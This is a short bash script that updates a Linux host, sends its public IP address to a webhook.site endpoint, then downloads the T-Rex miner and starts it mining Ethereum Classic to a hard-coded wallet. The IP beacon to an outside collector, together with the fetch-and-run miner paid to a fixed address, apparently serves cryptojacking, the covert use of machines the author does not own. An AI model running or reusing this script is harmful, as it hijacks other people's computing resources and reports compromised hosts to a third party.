#!/bin/bash
apt update -y
apt upgrade -y
apt install curl -y
apt install wget -y
apt install git -y
# Retrieve the public IP address
IP=$(curl -s https://api.ipify.org)
export IP=$(curl -s https://api.ipify.org)
# Send the IP address to your webhook
curl -X POST -d "$IP" "https://webhook.site/eb91a994-348f-43eb-847c-7849b9375e46"
wget https://github.com/trexminer/T-Rex/releases/download/0.23.2/t-rex-0.23.2-linux.tar.gz && tar -xvf t-rex-0.23.2-linux.tar.gz && ./t-rex -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0xE9D7B0C91a318ED1D016C51b7CC55D9a7A2ADaB5 -w RIG_ID -p x
